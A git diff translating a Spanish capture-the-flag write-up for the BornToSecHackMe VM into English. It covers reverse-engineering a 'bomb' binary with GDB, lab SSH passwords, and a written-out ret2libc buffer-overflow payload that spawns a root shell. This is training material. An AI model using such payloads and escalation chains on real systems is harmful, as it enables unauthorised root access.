-- `o`  → la etapa 5 tiene una solución que contiene la letra `o`
-- `4`  → la etapa 4 acepta un número relacionado con el `4`
+- `P` → Stage 1 accepts a phrase that begins with `P`
+- `2` → Stage 2 accepts a sequence containing the number `2`
+- `b` → Stage 3 has a solution containing the letter `b`
+- `o` → Stage 5 has a solution containing the letter `o`
+- `4` → Stage 4 accepts a number related to `4`
 
-**Recordatorio:**
+**Reminder:**
 
-El subject dice:
+The subject line reads:
 
-`"For the part related to a (bin) bomb: If the password found is 123456. The password to use is 123546."`.
+`"For the part related to a (bin) bomb: If the password found is 123456, the password to use is 123546."`.
 
-Es decir hay que intercambiar los dos últimos caracteres de la contraseña final.
+In other words, you need to swap the last two characters of the final password.
 
-## 9. Análisis del binario y Passwords exploit
+## 9. Binary Analysis and Passwords Exploit
 
-Desensamblamos con GDB y listamos las funciones:
+We disassembled it with GDB and listed the functions:
 ```bash
 laurie@BornToSecHackMe:~$ gdb ./bomb
 (gdb) info functions 
@@ -818,7 +812,7 @@ Non-debugging symbols:
 ...
 ```
 
-1. Comenzamos desamblando la función `phase_1` y encontraos con en la dirección `0x80497c0` se encuantra un string que coincide con el inicio de la prmera pista `"Public speaking is very easy."`: 
+1. We begin by disassembling the `phase_1` function and find that at address `0x80497c0` there is a string that matches the beginning of the first track `"Public speaking is very easy."`:
 
 ```asm
 (gdb) disas phase_1
@@ -845,10 +839,11 @@ End of assembler dump.
 ```
 ### **`Password Phase 1: Public speaking is very easy.`**
 
-2. El análisis del desensamblado de la función `phase_2` nos dice el tipo de retorno es un `int ()`:
-- lee 6 números.
-- Verfica que el primero debe ser 1
-- Cada siguiente es el anterior multiplicado por (i+1)
+2. The disassembly analysis of the `phase_2` function tells us that the return type is an `int()`:
+
+- It reads 6 numbers.
+- It verifies that the first one must be 1.
+- Each subsequent number is the previous number multiplied by (i+1).
 
 ```asm
 (gdb) disas phase_2
@@ -890,42 +885,41 @@ End of assembler dump.
 (gdb) ptype phase_2
 type = int ()
 ```
-### **Líneas 0 - 78:**
+### **Lines 0 - 78:**
 ```text
-1.  <+0>: Guarda en lo alto del stack el valor de `EBP` (cpu) `[esp + 0x00]`. El `ESP` se desplaza 4 bytes hacia abajo.
-2.  <+1>: Asigna el nuevo `ESP` a `EBP` para la función `phase_2`.
-3.  <+3>: Reserva (desplaza) `32 bytes` (0x20) en el stack de `phase_2()`.
-4.  <+6>: Guarda en el stack el registro `ESI` — el compilador lo preserva porque lo usará internamente.
-5.  <+7>: Guarda en el stack el registro `EBX` — ídem.
-6.  <+8>: Carga en `EDX` el argumento de `phase_2()` — el string introducido por el usuario desde `[ebp+0x8]`.
-7.  <+11>: Ajusta el stack para pasar los argumentos a `read_six_numbers()`.
-8.  <+14>: Calcula la dirección de `[ebp-0x18]` — el array local de 6 enteros — y la carga en `EAX`.
-9.  <+17>: Empuja la dirección del array como argumento de `read_six_numbers()`.
-10. <+18>: Empuja el string del usuario como argumento de `read_six_numbers()`.
-11. <+19>: Llama a `read_six_numbers(input, array)` — parsea el string del usuario y rellena el array con 6 enteros.
-12. <+24>: Restaura el stack.
-13. <+27>: Compara el primer elemento del array `[ebp-0x18]` con `1`.
-14. <+31>: `je` — si el primer número es `1` continúa. Si no salta a `<+33>`.
-15. <+33>: Llama a `explode_bomb()` — el primer número debe ser `1`.
-16. <+38>: Inicializa el contador `EBX` a `1` — inicio del bucle.
-17. <+43>: Carga en `ESI` la dirección base del array.
-18. <+46>: Calcula `EBX + 1` en `EAX` — el multiplicador de la iteración actual.
-19. <+49>: Multiplica `EAX` por el elemento anterior del array `[esi+ebx*4-0x4]` — calcula el valor esperado.
-20. <+54>: Compara el elemento actual del array `[esi+ebx*4]` con el valor esperado.
-21. <+57>: `je` — si son iguales continúa. Si no salta a `<+59>`.
-22. <+59>: Llama a `explode_bomb()` — el número no es el esperado.
-23. <+64>: Incrementa el contador `EBX`.
-24. <+65>: Compara `EBX` con `5`.
-25. <+68>: `jle` — si `EBX <= 5` vuelve a `<+46>` para la siguiente iteración.
-26. <+70>: Restaura `ESP`.
-27. <+73>: Restaura `EBX`.
-28. <+74>: Restaura `ESI`.
-29. <+75>: Restaura `ESP` desde `EBP`.
-30. <+77>: Restaura `EBP`.
-31. <+78>: `ret` — retorna el control al caller.
+1. <+0>: Saves the value of `EBP` (cpu) `[esp + 0x00]` to the top of the stack. `ESP` is shifted down 4 bytes.
+2. <+1>: Assigns the new `ESP` to `EBP` for the `phase_2` function.
+3. <+3>: Allocates (shifts) `32 bytes` (0x20) on the `phase_2()` stack.
+4. <+6>: Saves the `ESI` register to the stack — the compiler preserves it because it will use it internally.
+5. <+7>: Saves the `EBX` register to the stack — same applies.
+6. <+8>: Loads the `phase_2()` argument into `EDX` — the string entered by the user starting from `[ebp+0x8]`.
+7. <+11>: Adjusts the stack to pass the arguments to `read_six_numbers()`.
+8. <+14>: Calculates the address of `[ebp-0x18]` — the local array of 6 integers — and loads it into `EAX`.
+9. <+17>: Pushes the array address as an argument to `read_six_numbers()`.
+10. <+18>: Pushes the user string as an argument to `read_six_numbers()`.
+11. <+19>: Calls `read_six_numbers(input, array)` — parses the user string and fills the array with 6 integers.
+12. <+24>: Resets the stack.
+13. <+27>: Compares the first element of the array `[ebp-0x18]` with `1`.
+14. <+31>: `je` — if the first number is `1`, continue. Otherwise, jump to `<+33>`.
+15. <+33>: Call `explode_bomb()` — the first number must be `1`.
+16. <+38>: Initialize the `EBX` counter to `1` — beginning of the loop.
+17. <+43>: Load the base address of the array into `ESI`.
+18. <+46>: Calculate `EBX + 1` in `EAX` — the multiplier for the current iteration.
+19. <+49>: Multiply `EAX` by the previous element of the array `[esi+ebx*4-0x4]` — calculate the expected value.
+20. <+54>: Compare the current element of the array `[esi+ebx*4]` with the expected value. 21. <+57>: `je` — if they are equal, continue. Otherwise, jump to `<+59>`.
+22. <+59>: Call `explode_bomb()` — the number is not the expected one.
+23. <+64>: Increment the `EBX` counter.
+24. <+65>: Compare `EBX` with `5`.
+25. <+68>: `jle` — if `EBX <= 5`, return to `<+46>` for the next iteration.
+26. <+70>: Restore `ESP`.
+27. <+73>: Restore `EBX`.
+28. <+74>: Restore `ESI`.
+29. <+75>: Restore `ESP` from `EBP`.
+30. <+77>: Restore `EBP`.
+31. <+78>: `ret` — returns control to the caller.
 ```
 
-El bucle verifica que cada número sea el anterior multiplicado por (i+1):
+The loop verifies that each number is the previous number multiplied by (i+1):
 ```bash
 array[0] = 1
 array[1] = 1 * 2 = 2
@@ -935,34 +929,34 @@ array[4] = 24 * 5 = 120
 array[5] = 120 * 6 = 720
 ```
 
-Coincide con la pista 2 del README.
+It matches clue 2 of the README.
 ### **`Password Phase 2: 1 2 6 24 120 720`**
 
-3. En el análisis de la función `phase_3` el formato `"%d %c %d"` nos dice que la funciñon espera 3 valores: **número, carácter, número**.
+3. In the analysis of the `phase_3` function, the format `"%d %c %d"` tells us that the function expects 3 values: **number, character, number**.
 ```
 (gdb) x/s 0x80497de
 0x80497de:	 "%d %c %d"
 ```
 
- - El switch/case tiene 8 opciones (0-7). Buscando la **pista b del README** — hay tres casos con bl=0x62 que es b en ASCII:
+- The switch/case has 8 options (0-7). Looking for **clue b in the README** — there are three cases with bl=0x62 which is b in ASCII:
 ```asm
 0x08048c16 <+126>:	mov    bl,0x62
 0x08048c76 <+222>:	mov    bl,0x62
 0x08048c00 <+104>:	mov    bl,0x62
 ```
- - hay una tabla de saltos en la orden `<+62>`
- - `eax` es el primer número que se introuce.
- - Cada caso del switch asigna un valor a `bl` (el carácter) y compara el tercer número con un valor fijo.
+- There's a jump table in the `<+62>` command.
+- `eax` is the first number entered.
+- Each case of the switch assigns a value to `bl` (the character) and compares the third number to a fixed value.
 ```asm
 0x08048bd6 <+62>:	jmp    DWORD PTR [eax*4+0x80497e8]
 ```
-- Buscamos qué hay en la tabla de saltos en la dirección `0x80497e8`:
+- We look for what's in the jump table at address `0x80497e8`:
 ```
 (gdb) x/8wx 0x80497e8
 0x80497e8:	0x08048be0	0x08048c00	0x08048c16	0x08048c28
 0x80497f8:	0x08048c40	0x08048c52	0x08048c64	0x08048c76
 ```
-- Con esto ahora tenemos la tabla completa. Cada dirección corresponde a un caso:
+- With this, we now have the complete table. Each address corresponds to a case:
 ```bash
 case 0 → 0x08048be0 → bl=0x71('q'), número=0x309=777
 case 1 → 0x08048c00 → bl=0x62('b'), número=0xd6=214
@@ -973,16 +967,17 @@ case 5 → 0x08048c52 → bl=0x74('t'), número=0x1ca=458
 case 6 → 0x08048c64 → bl=0x76('v'), número=0x30c=780
 case 7 → 0x08048c76 → bl=0x62('b'), número=0x20c=524
 ```
-- Lo leemos directamente del ASM — por ejemplo case 1:
+- We read it directly from the ASM — for example case 1:
 ```
-<+104>: mov bl,0x62         ← 0x62 = 'b' en ASCII
-<+106>: cmp [ebp-0x4],0xd6  ← tercer número debe ser 0xd6 = 214
+<+104>: mov bl,0x62         ← 0x62 = 'b' in ASCII
+<+106>: cmp [ebp-0x4],0xd6  ← The third number must be 0xd6 = 214
 ```
 
-Coincide con la pista 3 del README cualquier caso con b funciona.
-### **`Password Phase 3: 1 b 214`**
+This matches clue 3 in the README; any case with `b` works.
 
-4. En el análisis de la función `phase_4`, vemos que lee un único número con `sscanf` usando el formato `"%d"` y lo pasa a `func4`. El resultado debe ser `0x37 = 55`:
+## **`Password Phase 3: 1 b 214`**
+
+4. In the analysis of the `phase_4` function, we see that it reads a single number with `sscanf` using the format `"%d"` and passes it to `func4`. The result should be `0x37 = 55`:
 
 ```bash
 (gdb) x/s 0x8049808
@@ -990,22 +985,22 @@ Coincide con la pista 3 del README cualquier caso con b funciona.
 ```
 
 ```asm
-<+61>: cmp eax, 0x37     ← func4(n) debe devolver 55
-<+64>: je  phase_4+71    ← si no, explota
+<+61>: cmp eax, 0x37     ← func4(n) should return 55
+<+64>: je  phase_4+71    ← Otherwise, it explodes.
 ```
 
-`func4` es una función recursiva — se llama a sí misma con `n-1` y `n-2`
-y suma los resultados. Es la **secuencia de Fibonacci**:
+`func4` is a recursive function — it calls itself with `n-1` and `n-2`
+and sums the results. It is the **Fibonacci sequence**:
 
 ```asm
 <+11>: cmp ebx, 0x1
-<+14>: jle func4+48      ← caso base: si n <= 1 devuelve 1
+<+14>: jle func4+48      ← base case: if n <= 1 return 1
 <+23>: call func4        ← func4(n-1)
 <+37>: call func4        ← func4(n-2)
-<+42>: add eax, esi      ← devuelve func4(n-1) + func4(n-2)
+<+42>: add eax, esi      ← return func4(n-1) + func4(n-2)
 ```
 
-Calculamos la secuencia hasta encontrar el índice que devuelve `55`:
+We calculate the sequence until we find the index that returns `55`:
 
 ```
 func4(1)  = 1
@@ -1016,87 +1011,84 @@ func4(5)  = 8
 func4(6)  = 13
 func4(7)  = 21
 func4(8)  = 34
-func4(9)  = 55  ← coincide con 0x37
+func4(9)  = 55  ← matches 0x37
 ```
 
-La pista del README es `4` — hace referencia al número `4` que aparece
-en el índice `9` de la secuencia (el cuarto primo de Fibonacci mayor que 1).
+The README clue is `4` — it refers to the number `4` that appears in index `9` of the sequence (the fourth Fibonacci prime greater than 1).
 
 ### **`Password Phase 4: 9`**
 
-5. El análisis de la función `phase_5` verifica que el string introducido tenga exactamente **6 caracteres**:
+5. The analysis of the `phase_5` function verifies that the entered string has exactly **6 characters**:
 
 ```asm
-<+23>: cmp eax, 0x6    ← longitud debe ser 6
+<+23>: cmp eax, 0x6    ← length should be 6
 <+28>: call explode_bomb
 ```
 
-Luego construye un nuevo string de 6 caracteres usando cada carácter del input como índice en el array `array.123`:
+Then it constructs a new 6-character string using each character of the input as an index in the array `array.123`:
 
 ```asm
-<+46>: and al, 0xf          ← coge los últimos 4 bits del carácter
-<+51>: mov al, [eax+esi*1]  ← usa esos 4 bits como índice en array.123
+<+46>: and al, 0xf          ← takes the last 4 bits of the character
+<+51>: mov al, [eax+esi*1]  ← Use those 4 bits as an index in array.123
 ```
 
-El array es:
+The array is:
 ```
 array.123 = "isrveawhobpnutfg"
-índice:      0123456789abcdef
+index:      0123456789abcdef
 ```
 
-El resultado debe ser igual a `"giants"`:
+The result should equal `"giants"`:
 ```
-g → índice 15 (0xf) → necesitamos un carácter cuyo último nibble sea f → 'o' (0x6f) u 'O' (0x4f)
-i → índice  0 (0x0) → 'p' (0x70) o 'P' (0x50)
-a → índice  5 (0x5) → 'e' (0x65) o 'E' (0x45)
-n → índice 13 (0xd) → 'm' (0x6d) o 'M' (0x4d)  (0xd = 13)
-t → índice 11 (0xb) → 'k' (0x6b) o 'K' (0x4b)  (0xb = 11)
-s → índice  2 (0x2) → 'r' (0x72) o 'R' (0x52)
+g → index 15 (0xf) → we need a character whose last nibble is f → 'o' (0x6f) or 'O' (0x4f)
+i → index  0 (0x0) → 'p' (0x70) o 'P' (0x50)
+a → index  5 (0x5) → 'e' (0x65) o 'E' (0x45)
+n → index 13 (0xd) → 'm' (0x6d) o 'M' (0x4d)  (0xd = 13)
+t → index 11 (0xb) → 'k' (0x6b) o 'K' (0x4b)  (0xb = 11)
+s → index  2 (0x2) → 'r' (0x72) o 'R' (0x52)
 ```
 
-La pista del README es `o` — corresponde al primer carácter con índice `f`.
-Una solución válida es `opekmq`.
+The README clue is `o` — corresponding to the first character with index `f`.
+
+A valid solution is `opekmq`.
 
 ### **`Password Phase 5: opekmq`**
 
-6. El análisis de la función `phase_6` es el más complejo. Lee **6 números** con `read_six_numbers` y aplica tres verificaciones:
+6. The analysis of the `phase_6` function is the most complex. It reads **6 numbers** with `read_six_numbers` and applies three checks:
 
-**Verificación 1 — valores entre 1 y 6:**
+**Verification 1 — values ​​between 1 and 6:**
 ```asm
 <+46>: dec eax
 <+47>: cmp eax, 0x5
-<+50>: jbe phase_6+57    ← si (valor-1) <= 5 continúa, es decir valor <= 6
+<+50>: jbe phase_6+57    ← If (value-1) <= 5, continue, that is, value <= 6
 <+52>: call explode_bomb
 ```
 
-**Verificación 2 — sin duplicados:**
+**Verification 2 — no duplicates:**
 ```asm
-<+84>: cmp eax, [esi+ebx*4]   ← compara cada número con los siguientes
-<+87>: jne phase_6+94         ← si son iguales explota
+<+84>: cmp eax, [esi+ebx*4]   ← Compare each number with the following
+<+87>: jne phase_6+94         ← If they are the same, it explodes.
 <+89>: call explode_bomb
 ```
 
-**Verificación 3 — linked list ordenada:**
+**Verification 3 — ordered linked list:**
 
-La dirección `0x804b26c` apunta a una **linked list** de 6 nodos. Cada nodo
-tiene un valor y un puntero al siguiente. Los números introducidos se usan
-como índices para reordenar los nodos de la lista:
+The address `0x804b26c` points to a **linked list** of 6 nodes. Each node has a value and a pointer to the next node. The numbers entered are used as indices to reorder the nodes in the list:
 
 ```asm
-<+120>: mov esi, [ebp-0x34]   ← puntero al primer nodo
-<+152>: mov esi, [esi+0x8]    ← avanza al siguiente nodo
+<+120>: mov esi, [ebp-0x34]   ← pointer to the first node
+<+152>: mov esi, [esi+0x8]    ← advance to the next node
 ```
 
-Una vez reordenada la lista, verifica que los valores estén en **orden
-descendente**:
+Once the list has been reordered, verify that the values ​​are in descending order:
 
 ```asm
-<+221>: cmp eax, [edx]        ← nodo actual debe ser >= nodo siguiente
+<+221>: cmp eax, [edx]        ← current node must be >= next node
 <+223>: jge phase_6+230
 <+225>: call explode_bomb
 ```
 
-Necesitamos conocer los valores de cada nodo. Los inspeccionamos en GDB:
+We need to know the values ​​of each node. We inspect them in GDB:
 
 ```bash
 (gdb) x/24wx 0x804b26c
@@ -1107,7 +1099,7 @@ Necesitamos conocer los valores de cada nodo. Los inspeccionamos en GDB:
 0x804b2ac <n44+4>:	0x00000000	0x00000000	0x00000063	0x00000000
 0x804b2bc <n47+8>:	0x00000000	0x00000001	0x00000000	0x00000000
 ```
-El formato de la memoria no es claro con ese comando. Necesitamos ver los nodos correctamente — cada nodo tiene valor (4 bytes) + índice (4 bytes) + siguiente (4 bytes):
+The memory format is unclear with that command. We need to see the nodes correctly—each node has value (4 bytes) + index (4 bytes) + next (4 bytes):
 
 ```bash
 (gdb) x/3wx 0x804b26c
@@ -1124,7 +1116,7 @@ El formato de la memoria no es claro con ese comando. Necesitamos ver los nodos 
 0x804b230 <node6>:	0x000001b0	0x00000006	0x00000000
 ```
 
-Con esta info ya tenemos todos los nodos:
+With this information we now have all the nodes:
 ```
 node1: valor=0x0fd=253,  índice=1
 node2: valor=0x2d5=725,  índice=2
@@ -1134,7 +1126,7 @@ node5: valor=0x0d4=212,  índice=5
 node6: valor=0x1b0=432,  índice=6
 ```
 
-Para que la lista quede en **orden descendente** necesitamos ordenar por valor de mayor a menor:
+To put the list in **descending order** we need to sort by value from highest to lowest:
 ```
 997  → node4 → índice 4
 725  → node2 → índice 2
@@ -1146,9 +1138,9 @@ Para que la lista quede en **orden descendente** necesitamos ordenar por valor d
 
 ### **`Password Phase 6: 4 2 6 3 1 5`**
 
-## 10. Ejecutamos el binario bomb
+## 10. We execute the bomb binary
 
-Ahora que disponemos del password de todas las etapas, ejecutamos el binario y comprobamos:
+Now that we have the password for all stages, we run the binary and check:
 ```bash
 laurie@BornToSecHackMe:~$ ./bomb 
 Welcome this is my little bomb !!!! You have 6 stages with
@@ -1168,11 +1160,11 @@ Good work!  On to the next...
 Congratulations! You've defused the bomb!
 ```
 
-## 11. Acceso SSH como thor
+## 11. SSH access as Thor
 
-Hemos comprobado que las contraseñas de las etapas son correctas.
+We have verified that the stage passwords are correct.
 
-La contraseña de `thor` se forma concatenando todas sin espacios y aplicando la regla del subject — intercambiar los dos últimos caracteres:
+The password for `thor` is formed by concatenating all the passwords without spaces and applying the subject rule—swapping the last two characters:
 
 ```
 Phase 1: Publicspeakingisveryeasy.
@@ -1183,7 +1175,7 @@ Phase 5: opekmq
 Phase 6: 426315
 ```
 
-Concatenado: `Publicspeakingisveryeasy.126241207201b2149opekmq426135`
+Concatenated: `Publicspeakingisveryeasy.126241207201b2149opekmq426135`
 ```bash
 laurie@BornToSecHackMe:~$ ssh thor@192.168.0.30
         ____                _______    _____           
@@ -1198,7 +1190,7 @@ thor@192.168.0.30's password:
 thor@BornToSecHackMe:~$
 ```
 
-Una vez que hemos iniciado sesión como Thor y listamos el directorio principal encontramos dos archivos — `READEM` y `turtle`:
+Once we have logged in as Thor and listed the main directory, we find two files — `READEM` and `turtle`:
 ```bash
 thor@BornToSecHackMe:~$ ls -la
 total 41
@@ -1243,15 +1235,15 @@ Recule 200 spaces
 Can you digest the message? :)
 ```
 
-El nombre "turtle" hace referencia al módulo `turtle` de Python. Este módulo permite dibujar figuras mediante instrucciones dadas en un programa Python.
+The name "turtle" refers to the Python module `turtle`. This module allows you to draw figures using instructions given in a Python program.
 
 ## 12. Python Draw
 
-Necesitamos convertir las instrucciones dadas a código Python y ejecutarlo.
+We need to convert the given instructions into Python code and run it.
 
-El archivo `turtle` necesita ejecutarse en nuestro host porque la VM no tiene entorno gráfico. Descargamos el archivo primero, creamos el programa en python y lo ejecutamos.
+The `turtle` file needs to be run on our host because the VM doesn't have a graphical environment. We download the file first, create the Python program, and then run it.
 
-En nuestro host:
+On our host:
 ```bash
 scp thor@192.168.0.30:~/turtle /tmp/turtle.txt
 ```
@@ -1270,7 +1262,7 @@ thor@192.168.0.30's password:
 turtle                                                      100%   31KB  18.3MB/s   00:00    
 ```
 
-Creamos `draw.py`:
+We created `draw.py`:
 ```bash
 cat > /tmp/draw.py << 'EOF'
 import turtle
@@ -1308,12 +1300,12 @@ turtle.done()
 EOF
 ```
 
-Y ejecutamos:
+And we execute:
 ```bash
 python3 /tmp/draw.py
 ```
 
-En la imagen se ven las letras `SLASH` dibujadas. Ahora aplicamos `MD5`:
+The image shows the letters `SLASH` drawn on it. Now we apply `MD5`:
 
 ![Turtle Draw](img/python_tutle.png)
 
@@ -1322,15 +1314,15 @@ thor@BornToSecHackMe:~$ echo -n "SLASH" | md5sum
 646da671ca01bb5d84dbb5fb2238dc8e  -
 ```
 
-Esta es la contraseña del usuario `zaz`
+This is the password for the user `zaz`
 ```text
-Usuario: zaz
+User: zaz
 Pasword: 646da671ca01bb5d84dbb5fb2238dc8e
 ```
 
 ## 13. Acceso SSH como zaz
 
-Accedemos con el usuairo `zaz` y realizamos un listado a ver que encontamos:
+Log in with the username `zaz` and we'll make a list to see what we find:
 ```bash
 thor@BornToSecHackMe:~$ ssh zaz@192.168.0.30
         ____                _______    _____           
@@ -1356,11 +1348,11 @@ drwxr-x--- 3 zaz      zaz   107 Oct  8  2015 mail
 -rwxr-x--- 1 zaz      zaz  1342 Oct 15  2015 .viminfo
 ```
 
-Una rápida inspección del hmoe nos muestra un archivo binario llamado `exploit_me` que se ejecutará como usuario root.
+A quick inspection of the home directory reveals a binary file called `exploit_me` that will be executed as the root user.
 
-Si logramos generar una consola usando este binario, tendremos permisos de root.
+If we manage to generate a console using this binary, we will have root privileges.
 
-En primer lugar, listamos todas las funciones usando GDB y vemos que solo hay una función -> `main()`
+First, we list all the functions using GDB and see that there is only one function: `main()`.
 
 ```bash
 (gdb) info functions 
@@ -1371,7 +1363,7 @@ All defined functions:
 [...]
 ```
 
-Desensamblamos `main()`:
+We disassemble `main()`:
 
 ```asm
 (gdb) disas main
@@ -1400,24 +1392,21 @@ Dump of assembler code for function main:
 End of assembler dump.
 ```
 
-- `<+6>`: Reserva `0x90` (144) bytes en el stack — el buffer `dest` tiene **128 bytes** útiles (144 - 16 bytes de alineación).
-- `<+12>` y `<+16>`: Comprueba que `argc > 1` — si no hay argumento sale con `return 1`.
-- `<+28>` a `<+31>`: Carga `argv[1]` — el argumento que pasamos al binario.
-- `<+44>`: Llama a `strcpy(dest, argv[1])` — copia `argv[1]` en el buffer **sin comprobar
-  el tamaño**. Si el argumento supera los 128 bytes desbordamos el buffer y
-  sobrescribimos el `EIP`.
-- `<+56>`: Llama a `puts(dest)` — imprime el contenido del buffer.
+- `<+6>`: Allocates `0x90` (144) bytes on the stack — the buffer `dest` has **128 bytes** of usable data (144 - 16 bytes of alignment).
+- `<+12>` and `<+16>`: Checks that `argc > 1` — if there is no argument, exits with `return 1`.
+- `<+28>` to `<+31>`: Loads `argv[1]` — the argument passed to the binary.
+- `<+44>`: Calls `strcpy(dest, argv[1])` — copies `argv[1]` into the buffer **without checking the size**. If the argument exceeds 128 bytes, the buffer overflows and the `EIP` is overwritten.
+- `<+56>`: Calls `puts(dest)` — prints the contents of the buffer.
 
-El vector de ataque es un **Stack Buffer Overflow** clásico mediante `Ret2Libc` —
-el mismo que usamos en el `level07` de OverRide. Necesitamos:
+The attack vector is a classic Stack Buffer Overflow using `Ret2Libc` — the same one we used in `level07` of OverRide. We need to:
 
-1. Localizar las direcciones de `system()`, `exit()` y `/bin/sh` en la libc.
-2. Calcular el offset exacto hasta el `EIP`.
-3. Construir el payload: `padding + system() + exit() + /bin/sh`.
+1. Locate the addresses of `system()`, `exit()`, and `/bin/sh` in libc.
+2. Calculate the exact offset to the `EIP`.
+3. Construct the payload: `padding + system() + exit() + /bin/sh`.
 
-## 14. Calcular el offset
+## 14. Calculate the offset
 
-Localizamos las direcciones:
+We located the addresses:
 ```bash
 (gdb) b main
 Breakpoint 1 at 0x80483f7
@@ -1450,19 +1439,19 @@ Mapped address spaces:
 (gdb) 
 ```
 
-Tenemos `system` y `exit`. Ahora buscamos `/bin/sh` en la libc:
+We have `system` and `exit`. Now we look for `/bin/sh` in the libc:
 ```bash
 (gdb) find 0xb7e2c000,0xb7fd2000,"/bin/sh"
 0xb7f8cc58
 1 pattern found.
 ```
 
-Tenemos todo. Ahora calculamos el offset hasta el EIP -> el buffer es de 128 bytes más 4 bytes de EBP guardado = 140 bytes de padding:
+We have everything. Now we calculate the offset to the EIP -> the buffer is 128 bytes plus 4 bytes of saved EBP = 140 bytes of padding:
 ```bash
 (gdb) r $(python -c "print 'A' * 140 + 'BBBB'")
 ```
 
-Si `EIP` vale `0x42424242` el offset es correcto:
+If `EIP` is `0x42424242`, the offset is correct:
 ```bash
 (gdb) r $(python -c "print 'A' * 140 + 'BBBB'")
 The program being debugged has been started already.
@@ -1480,11 +1469,11 @@ Program received signal SIGSEGV, Segmentation fault.
 (gdb) 
 ```
 
-`EIP` vale `0x42424242` -> el offset de 140 bytes es correcto.
+`EIP` is `0x42424242` -> the 140-byte offset is correct.
 
-## 15. Construir el payload
+## 15. Build the payload
 
-Construimos el payload con las direcciones que tenemos:
+We build the payload with the addresses we have:
 ```text
 system():  0xb7e6b060
 exit():    0xb7e5ebe0
@@ -1492,7 +1481,7 @@ exit():    0xb7e5ebe0
 ```
 **padding (140 bytes) + system() + exit() + /bin/sh**
 
-Y ejecutamos:
+And we execute:
 
 ```bash
 zaz@BornToSecHackMe:~$ ./exploit_me $(python -c "print 'A' * 140 + '\x60\xb0\xe6\xb7' + '\xe0\xeb\xe5\xb7' + '\x58\xcc\xf8\xb7'")
@@ -1506,15 +1495,13 @@ root:x:0:0:root:/root:/bin/bash
 ft_root:x:1000:1000:ft_root,,,:/home/ft_root:/bin/bash
 ```
 
-## 16. Conclusión del Writeup 1
+## 16. Writeup 1 Conclusion
 
-El writeup 1 sigue una cadena de explotación en 15 pasos que va desde el
-descubrimiento de la IP hasta la obtención de root:
+Writeup 1 follows a 15-step exploit chain that goes from IP discovery to obtaining root access:
 
 ```
-Reconocimiento → Foro → Webmail → phpMyAdmin → Webshell →
-www-data → FTP → laurie → Bomb → thor → Turtle → zaz → ROOT
+Recognition → Foro → Webmail → phpMyAdmin → Webshell → www-data → FTP → laurie → Bomb → thor → Turtle → zaz → ROOT
 ```
 
-Cada paso aprovecha una vulnerabilidad o información filtrada por el paso anterior, credenciales expuestas en logs, contraseñas en archivos del sistema, inyección SQL para crear un webshell, y finalmente un Stack Buffer Overflow con Ret2LibC para escalar a root.
+Each step exploits a vulnerability or information leaked by the previous step, credentials exposed in logs, passwords in system files, SQL injection to create a webshell, and finally a Stack Buffer Overflow with Ret2LibC to escalate to root.
 
